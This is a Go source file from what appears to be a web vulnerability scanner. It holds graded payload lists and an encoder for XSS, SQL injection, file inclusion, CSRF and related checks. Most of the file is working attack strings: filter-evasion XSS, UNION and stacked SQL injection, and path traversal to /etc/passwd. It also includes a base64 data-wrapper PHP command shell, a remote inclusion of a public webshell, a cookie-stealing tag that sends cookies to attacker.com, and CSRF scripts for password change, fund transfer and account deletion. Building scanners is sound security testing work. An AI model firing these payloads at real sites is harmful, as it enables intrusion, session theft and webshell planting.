// pkg/tools/webvuln/payloads.go
package webvuln

import (
	"encoding/base64"
	"fmt"
	"html"
	"net/url"
	"strings"
)

// PayloadManager handles the generation and management of payloads
type PayloadManager struct {
	XSSPayloads            []Payload
	SQLInjectionPayloads   []Payload
	FileInclusionPayloads  []Payload
	CSRFPayloads           []Payload
	MisconfigurationChecks []Payload
	AuthTestPayloads       []Payload
	InfoDisclosureChecks   []Payload
	MaxLevel               int
}

// NewPayloadManager creates a new PayloadManager with default payloads
func NewPayloadManager(maxLevel int) *PayloadManager {
	if maxLevel <= 0 || maxLevel > 5 {
		maxLevel = 3 // Default to medium payload complexity
	}

	pm := &PayloadManager{
		MaxLevel: maxLevel,
	}

	pm.initXSSPayloads()
	pm.initSQLInjectionPayloads()
	pm.initFileInclusionPayloads()
	pm.initCSRFPayloads()
	pm.initMisconfigurationChecks()
	pm.initAuthTestPayloads()
	pm.initInfoDisclosureChecks()

	return pm
}

// GetPayloads returns payloads for a specific vulnerability type filtered by level
func (pm *PayloadManager) GetPayloads(vulnType VulnerabilityType) []Payload {
	var payloads []Payload

	switch vulnType {
	case VulnTypeXSS:
		payloads = pm.XSSPayloads
	case VulnTypeSQLInjection:
		payloads = pm.SQLInjectionPayloads
	case VulnTypeFileInclusion:
		payloads = pm.FileInclusionPayloads
	case VulnTypeCSRF:
		payloads = pm.CSRFPayloads
	case VulnTypeMisconfiguration:
		payloads = pm.MisconfigurationChecks
	case VulnTypeAuthWeak:
		payloads = pm.AuthTestPayloads
	case VulnTypeInfoDisclosure:
		payloads = pm.InfoDisclosureChecks
	}

	// Filter by complexity level
	result := make([]Payload, 0)
	for _, p := range payloads {
		if p.Level <= pm.MaxLevel {
			result = append(result, p)
		}
	}

	return result
}

// EncodePayload applies the specified encoding to a payload
func (pm *PayloadManager) EncodePayload(payload, encoding string) string {
	switch strings.ToLower(encoding) {
	case "url":
		return url.QueryEscape(payload)
	case "double-url":
		return url.QueryEscape(url.QueryEscape(payload))
	case "html":
		return html.EscapeString(payload)
	case "base64":
		return base64.StdEncoding.EncodeToString([]byte(payload))
	case "hex":
		var hexStr string
		for _, ch := range payload {
			hexStr += fmt.Sprintf("%%%02x", ch)
		}
		return hexStr
	default:
		return payload
	}
}

// initXSSPayloads initializes XSS test payloads
func (pm *PayloadManager) initXSSPayloads() {
	pm.XSSPayloads = []Payload{
		// Level 1: Basic XSS payloads
		{
			Value:       "<script>alert('XSS')</script>",
			Type:        VulnTypeXSS,
			Description: "Basic JavaScript Alert XSS",
			Level:       1,
		},
		{
			Value:       "<img src=x onerror=alert('XSS')>",
			Type:        VulnTypeXSS,
			Description: "Image onerror event XSS",
			Level:       1,
		},
		{
			Value:       "<svg onload=alert('XSS')>",
			Type:        VulnTypeXSS,
			Description: "SVG onload event XSS",
			Level:       1,
		},

		// Level 2: Evasion techniques
		{
			Value:       "<script>alert(String.fromCharCode(88,83,83))</script>",
			Type:        VulnTypeXSS,
			Description: "Character code obfuscation XSS",
			Level:       2,
		},
		{
			Value:       "<img src=\"javascript:alert('XSS')\">",
			Type:        VulnTypeXSS,
			Description: "JavaScript protocol in img src XSS",
			Level:       2,
		},
		{
			Value:       "<div onmouseover=\"alert('XSS')\">Hover me!</div>",
			Type:        VulnTypeXSS,
			Description: "Mouse event XSS",
			Level:       2,
		},

		// Level 3: Bypassing common filters
		{
			Value:       "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
			Type:        VulnTypeXSS,
			Description: "Script tag splitting XSS",
			Level:       3,
		},
		{
			Value:       "<SCRIPT/SRC=\"data:;base64,YWxlcnQoJ1hTUycp\"></SCRIPT>",
			Type:        VulnTypeXSS,
			Description: "Base64 encoded payload XSS",
			Level:       3,
		},
		{
			Value:       "javascript:/*--></title></style></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
			Type:        VulnTypeXSS,
			Description: "Complex context breaking XSS",
			Level:       3,
		},

		// Level 4: Advanced techniques
		{
			Value:       "<iframe src=\"javascript:alert(`XSS`)\"></iframe>",
			Type:        VulnTypeXSS,
			Description: "Iframe based XSS",
			Level:       4,
		},
		{
			Value:       "'-prompt(1)-'",
			Type:        VulnTypeXSS,
			Description: "SQL-like quoting bypass XSS",
			Level:       4,
		},
		{
			Value:       "<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>",
			Type:        VulnTypeXSS,
			Description: "XML injection with HTML5 mathML tags XSS",
			Level:       4,
		},

		// Level 5: Exotic payloads
		{
			Value:       "<script>function x(x){return x};alert(x(`XSS`))</script>",
			Type:        VulnTypeXSS,
			Description: "Function constructor XSS",
			Level:       5,
		},
		{
			Value:       "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
			Type:        VulnTypeXSS,
			Description: "Base64 eval XSS",
			Level:       5,
		},
		{
			Value:       "<div id=\"\"><a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">Click me</a></div>",
			Type:        VulnTypeXSS,
			Description: "HTML entity encoding XSS",
			Level:       5,
		},
	}
}

// initSQLInjectionPayloads initializes SQL Injection test payloads
func (pm *PayloadManager) initSQLInjectionPayloads() {
	pm.SQLInjectionPayloads = []Payload{
		// Level 1: Basic SQL Injection
		{
			Value:       "' OR '1'='1",
			Type:        VulnTypeSQLInjection,
			Description: "Basic SQL authentication bypass",
			Level:       1,
		},
		{
			Value:       "1' OR '1'='1' --",
			Type:        VulnTypeSQLInjection,
			Description: "Basic SQL injection with comment",
			Level:       1,
		},
		{
			Value:       "' OR 1=1 --",
			Type:        VulnTypeSQLInjection,
			Description: "Basic numeric SQL injection with comment",
			Level:       1,
		},

		// Level 2: Error-based SQL Injection
		{
			Value:       "' AND (SELECT 1 FROM non_existent_table) --",
			Type:        VulnTypeSQLInjection,
			Description: "Error-based injection with non-existent table",
			Level:       2,
		},
		{
			Value:       "' AND 1=CONVERT(int, '~') --",
			Type:        VulnTypeSQLInjection,
			Description: "Error-based SQL Server conversion",
			Level:       2,
		},
		{
			Value:       "' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) --",
			Type:        VulnTypeSQLInjection,
			Description: "MySQL error-based extraction",
			Level:       2,
		},

		// Level 3: Time-based blind SQL Injection
		{
			Value:       "' OR IF(1=1, SLEEP(2), 0) --",
			Type:        VulnTypeSQLInjection,
			Description: "MySQL time-based blind injection",
			Level:       3,
		},
		{
			Value:       "' OR 1=1 AND (SELECT pg_sleep(2)) --",
			Type:        VulnTypeSQLInjection,
			Description: "PostgreSQL time-based blind injection",
			Level:       3,
		},
		{
			Value:       "'; WAITFOR DELAY '0:0:2' --",
			Type:        VulnTypeSQLInjection,
			Description: "SQL Server time-based blind injection",
			Level:       3,
		},

		// Level 4: Union-based SQL Injection
		{
			Value:       "' UNION SELECT NULL, NULL, NULL --",
			Type:        VulnTypeSQLInjection,
			Description: "UNION-based column enumeration",
			Level:       4,
		},
		{
			Value:       "' UNION SELECT 1, 2, database() --",
			Type:        VulnTypeSQLInjection,
			Description: "UNION-based MySQL database name extraction",
			Level:       4,
		},
		{
			Value:       "' UNION SELECT 1, table_name, 3 FROM information_schema.tables --",
			Type:        VulnTypeSQLInjection,
			Description: "UNION-based table names extraction",
			Level:       4,
		},

		// Level 5: Advanced and stacked queries
		{
			Value:       "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
			Type:        VulnTypeSQLInjection,
			Description: "Stacked queries with INSERT statement",
			Level:       5,
		},
		{
			Value:       "' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND substring(password,1,1)='a') --",
			Type:        VulnTypeSQLInjection,
			Description: "Boolean-based blind password extraction",
			Level:       5,
		},
		{
			Value:       "';DECLARE @q NVARCHAR(800);SET @q=CAST(0x440045004300 AS NVARCHAR(800));EXEC(@q);--",
			Type:        VulnTypeSQLInjection,
			Description: "SQL Server hexadecimal encoded execution",
			Level:       5,
		},
	}
}

// initFileInclusionPayloads initializes LFI/RFI test payloads
func (pm *PayloadManager) initFileInclusionPayloads() {
	pm.FileInclusionPayloads = []Payload{
		// Level 1: Basic LFI
		{
			Value:       "../../../../../etc/passwd",
			Type:        VulnTypeFileInclusion,
			Description: "Basic path traversal to /etc/passwd",
			Level:       1,
		},
		{
			Value:       "..\\..\\..\\..\\..\\windows\\win.ini",
			Type:        VulnTypeFileInclusion,
			Description: "Windows path traversal to win.ini",
			Level:       1,
		},
		{
			Value:       "/etc/passwd",
			Type:        VulnTypeFileInclusion,
			Description: "Direct path to system file",
			Level:       1,
		},

		// Level 2: Path traversal with evasion techniques
		{
			Value:       "....//....//....//....//....//etc/passwd",
			Type:        VulnTypeFileInclusion,
			Description: "Path traversal with nested traversal sequences",
			Level:       2,
		},
		{
			Value:       "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
			Type:        VulnTypeFileInclusion,
			Description: "URL encoded path traversal",
			Level:       2,
		},
		{
			Value:       "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
			Type:        VulnTypeFileInclusion,
			Description: "Double URL encoded path traversal",
			Level:       2,
		},

		// Level 3: Null byte injection and wrappers
		{
			Value:       "../../../../../etc/passwd%00",
			Type:        VulnTypeFileInclusion,
			Description: "Null byte to bypass extension check",
			Level:       3,
		},
		{
			Value:       "php://filter/convert.base64-encode/resource=config.php",
			Type:        VulnTypeFileInclusion,
			Description: "PHP filter wrapper for file disclosure",
			Level:       3,
		},
		{
			Value:       "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
			Type:        VulnTypeFileInclusion,
			Description: "Data wrapper with base64 encoded PHP code",
			Level:       3,
		},

		// Level 4: Remote file inclusion
		{
			Value:       "http://example.com/malicious.txt",
			Type:        VulnTypeFileInclusion,
			Description: "Basic remote file inclusion",
			Level:       4,
		},
		{
			Value:       "https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/phpkit.php",
			Type:        VulnTypeFileInclusion,
			Description: "RFI pointing to a public webshell",
			Level:       4,
		},
		{
			Value:       "ftp://example.com/pub/backdoor.php",
			Type:        VulnTypeFileInclusion,
			Description: "FTP protocol remote inclusion",
			Level:       4,
		},

		// Level 5: Advanced techniques
		{
			Value:       "expect://ls",
			Type:        VulnTypeFileInclusion,
			Description: "Expect wrapper for command execution",
			Level:       5,
		},
		{
			Value:       "zip://shell.jpg%23payload.php",
			Type:        VulnTypeFileInclusion,
			Description: "Zip wrapper for archived file inclusion",
			Level:       5,
		},
		{
			Value:       "phar://pharfile.phar/payload.txt",
			Type:        VulnTypeFileInclusion,
			Description: "Phar wrapper exploitation",
			Level:       5,
		},
	}
}

// initCSRFPayloads initializes CSRF test payloads
func (pm *PayloadManager) initCSRFPayloads() {
	pm.CSRFPayloads = []Payload{
		// Level 1: Basic CSRF checks
		{
			Value:       "<img src=\"x\" onerror=\"this.src='http://attacker.com/log?cookie='+document.cookie\">",
			Type:        VulnTypeCSRF,
			Description: "Basic cookie stealing via image",
			Level:       1,
		},
		{
			Value:       "<form id=\"csrf-form\" action=\"http://target.com/change_password\" method=\"POST\"><input type=\"hidden\" name=\"new_password\" value=\"hacked\"></form><script>document.getElementById(\"csrf-form\").submit();</script>",
			Type:        VulnTypeCSRF,
			Description: "Automatic form submission CSRF",
			Level:       1,
		},
		{
			Value:       "Origin: null",
			Type:        VulnTypeCSRF,
			Description: "Missing Origin header check",
			Level:       1,
		},

		// Level 2: Header manipulations
		{
			Value:       "Referer: https://attacker.com",
			Type:        VulnTypeCSRF,
			Description: "Spoofed Referer header",
			Level:       2,
		},
		{
			Value:       "X-CSRF-Token: invalid_token",
			Type:        VulnTypeCSRF,
			Description: "Invalid CSRF token testing",
			Level:       2,
		},
		{
			Value:       "X-Requested-With: NOT_XMLHttpRequest",
			Type:        VulnTypeCSRF,
			Description: "Modified X-Requested-With header",
			Level:       2,
		},

		// Level 3: More complex CSRF
		{
			Value:       "<script>fetch('http://target.com/api/transfer', {method: 'POST', credentials: 'include', body: JSON.stringify({amount: 1000, to: 'attacker'})});</script>",
			Type:        VulnTypeCSRF,
			Description: "CSRF via fetch API with JSON payload",
			Level:       3,
		},
		{
			Value:       "<iframe style=\"display:none\" name=\"csrf-frame\"></iframe><form target=\"csrf-frame\" action=\"http://target.com/api/action\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"delete_account\"></form><script>document.forms[0].submit();</script>",
			Type:        VulnTypeCSRF,
			Description: "Hidden iframe CSRF for silent submission",
			Level:       3,
		},
		{
			Value:       "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://target.com/api/action', true); xhr.withCredentials = true; xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send('{\"action\":\"update_email\",\"email\":\"attacker@evil.com\"}');</script>",
			Type:        VulnTypeCSRF,
			Description: "XMLHttpRequest CSRF with JSON content type",
			Level:       3,
		},

		// Not including levels 4 and 5 for CSRF as it's typically a yes/no vulnerability
		// rather than one with complex exploits
	}
}

// initMisconfigurationChecks initializes security misconfiguration tests
func (pm *PayloadManager) initMisconfigurationChecks() {
	pm.MisconfigurationChecks = []Payload{
		// Level 1: Basic headers and information checks
		{
			Value:       "X-XSS-Protection",
			Type:        VulnTypeMisconfiguration,
			Description: "Missing or misconfigured XSS protection header",
			Level:       1,
		},
		{
			Value:       "X-Content-Type-Options",
			Type:        VulnTypeMisconfiguration,
			Description: "Missing content type options header",
			Level:       1,
		},
		{
			Value:       "X-Frame-Options",
			Type:        VulnTypeMisconfiguration,
			Description: "Missing or weak framing protection",
			Level:       1,
		},

		// Level 2: CORS and security policy misconfiguration
		{
			Value:       "Access-Control-Allow-Origin: *",
			Type:        VulnTypeMisconfiguration,
			Description: "Overly permissive CORS policy",
			Level:       2,
		},
		{
			Value:       "Content-Security-Policy",
			Type:        VulnTypeMisconfiguration,
			Description: "Missing or weak content security policy",
			Level:       2,
		},
		{
			Value:       "Strict-Transport-Security",
			Type:        VulnTypeMisconfiguration,
			Description: "Missing HSTS header",
			Level:       2,
		},

		// Level 3: Common file checks
		{
			Value:       "/.git/config",
			Type:        VulnTypeMisconfiguration,
			Description: "Exposed Git repository",
			Level:       3,
		},
		{
			Value:       "/.env",
			Type:        VulnTypeMisconfiguration,
			Description: "Exposed environment file",
			Level:       3,
		},
		{
			Value:       "/wp-config.php.bak",
			Type:        VulnTypeMisconfiguration,
			Description: "Backup configuration files",
			Level:       3,
		},

		// Level 4: Service misconfiguration
		{
			Value:       "/phpinfo.php",
			Type:        VulnTypeMisconfiguration,
			Description: "Exposed PHP information",
			Level:       4,
		},
		{
			Value:       "/server-status",
			Type:        VulnTypeMisconfiguration,
			Description: "Exposed server status page",
			Level:       4,
		},
		{
			Value:       "/?debug=true",
			Type:        VulnTypeMisconfiguration,
			Description: "Debug mode enabled",
			Level:       4,
		},

		// Level 5: Advanced misconfigurations
		{
			Value:       "/actuator/health",
			Type:        VulnTypeMisconfiguration,
			Description: "Exposed Spring Boot actuators",
			Level:       5,
		},
		{
			Value:       "/_cat/indices",
			Type:        VulnTypeMisconfiguration,
			Description: "Exposed Elasticsearch API",
			Level:       5,
		},
		{
			Value:       "/console/",
			Type:        VulnTypeMisconfiguration,
			Description: "Exposed web console",
			Level:       5,
		},
	}
}

// initAuthTestPayloads initializes authentication weakness test payloads
func (pm *PayloadManager) initAuthTestPayloads() {
	pm.AuthTestPayloads = []Payload{
		// Level 1: Common weak credentials
		{
			Value:       "admin:admin",
			Type:        VulnTypeAuthWeak,
			Description: "Default admin credentials",
			Level:       1,
		},
		{
			Value:       "admin:password",
			Type:        VulnTypeAuthWeak,
			Description: "Weak admin password",
			Level:       1,
		},
		{
			Value:       "user:password",
			Type:        VulnTypeAuthWeak,
			Description: "Generic weak credentials",
			Level:       1,
		},

		// Level 2: Brute force protection test
		{
			Value:       "BRUTEFORCE_TEST",
			Type:        VulnTypeAuthWeak,
			Description: "Testing for brute force protection",
			Level:       2,
		},
		{
			Value:       "LOCKOUT_TEST",
			Type:        VulnTypeAuthWeak,
			Description: "Testing for account lockout",
			Level:       2,
		},
		{
			Value:       "RATE_LIMIT_TEST",
			Type:        VulnTypeAuthWeak,
			Description: "Testing for rate limiting",
			Level:       2,
		},

		// Level 3: Password policy tests
		{
			Value:       "PASSWORD_LENGTH",
			Type:        VulnTypeAuthWeak,
			Description: "Testing minimum password length requirements",
			Level:       3,
		},
		{
			Value:       "PASSWORD_COMPLEXITY",
			Type:        VulnTypeAuthWeak,
			Description: "Testing password complexity requirements",
			Level:       3,
		},
		{
			Value:       "PASSWORD_HISTORY",
			Type:        VulnTypeAuthWeak,
			Description: "Testing password history enforcement",
			Level:       3,
		},

		// Level 4: Session management tests
		{
			Value:       "SESSION_FIXATION",
			Type:        VulnTypeAuthWeak,
			Description: "Testing for session fixation vulnerability",
			Level:       4,
		},
		{
			Value:       "SESSION_TIMEOUT",
			Type:        VulnTypeAuthWeak,
			Description: "Testing session timeout implementation",
			Level:       4,
		},
		{
			Value:       "SESSION_INVALIDATION",
			Type:        VulnTypeAuthWeak,
			Description: "Testing session invalidation after logout",
			Level:       4,
		},

		// Level 5: Advanced auth issues
		{
			Value:       "MFA_BYPASS",
			Type:        VulnTypeAuthWeak,
			Description: "Testing for MFA bypass vulnerabilities",
			Level:       5,
		},
		{
			Value:       "PASSWORD_RESET",
			Type:        VulnTypeAuthWeak,
			Description: "Testing password reset functionality",
			Level:       5,
		},
		{
			Value:       "JWT_NONE_ALG",
			Type:        VulnTypeAuthWeak,
			Description: "Testing JWT with 'none' algorithm vulnerability",
			Level:       5,
		},
	}
}

// initInfoDisclosureChecks initializes information disclosure test payloads
func (pm *PayloadManager) initInfoDisclosureChecks() {
	pm.InfoDisclosureChecks = []Payload{
		// Level 1: Basic information disclosure checks
		{
			Value:       "X-Powered-By",
			Type:        VulnTypeInfoDisclosure,
			Description: "Technology disclosure in headers",
			Level:       1,
		},
		{
			Value:       "Server",
			Type:        VulnTypeInfoDisclosure,
			Description: "Server information in headers",
			Level:       1,
		},
		{
			Value:       "COMMENTS_CHECK",
			Type:        VulnTypeInfoDisclosure,
			Description: "HTML comments with sensitive information",
			Level:       1,
		},

		// Level 2: Error message checks
		{
			Value:       "ERROR_TRIGGER_SQL",
			Type:        VulnTypeInfoDisclosure,
			Description: "SQL error message disclosure",
			Level:       2,
		},
		{
			Value:       "ERROR_TRIGGER_PATH",
			Type:        VulnTypeInfoDisclosure,
			Description: "Path disclosure in error messages",
			Level:       2,
		},
		{
			Value:       "STACK_TRACE",
			Type:        VulnTypeInfoDisclosure,
			Description: "Stack trace disclosure",
			Level:       2,
		},

		// Level 3: Common sensitive files
		{
			Value:       "/robots.txt",
			Type:        VulnTypeInfoDisclosure,
			Description: "Information in robots.txt",
			Level:       3,
		},
		{
			Value:       "/sitemap.xml",
			Type:        VulnTypeInfoDisclosure,
			Description: "Information in sitemap.xml",
			Level:       3,
		},
		{
			Value:       "/.well-known/",
			Type:        VulnTypeInfoDisclosure,
			Description: "Sensitive information in .well-known directory",
			Level:       3,
		},

		// Level 4: Method testing
		{
			Value:       "OPTIONS_METHOD",
			Type:        VulnTypeInfoDisclosure,
			Description: "HTTP OPTIONS method disclosure",
			Level:       4,
		},
		{
			Value:       "TRACE_METHOD",
			Type:        VulnTypeInfoDisclosure,
			Description: "HTTP TRACE method enabled",
			Level:       4,
		},
		{
			Value:       "HEAD_METHOD",
			Type:        VulnTypeInfoDisclosure,
			Description: "Information disclosure in HEAD response",
			Level:       4,
		},

		// Level 5: Advanced enumeration
		{
			Value:       "VERSION_CHECK",
			Type:        VulnTypeInfoDisclosure,
			Description: "Software version information check",
			Level:       5,
		},
		{
			Value:       "API_DOCUMENTATION",
			Type:        VulnTypeInfoDisclosure,
			Description: "Exposed API documentation check",
			Level:       5,
		},
		{
			Value:       "DIRECTORY_LISTING",
			Type:        VulnTypeInfoDisclosure,
			Description: "Directory listing enabled check",
			Level:       5,
		},
	}
}
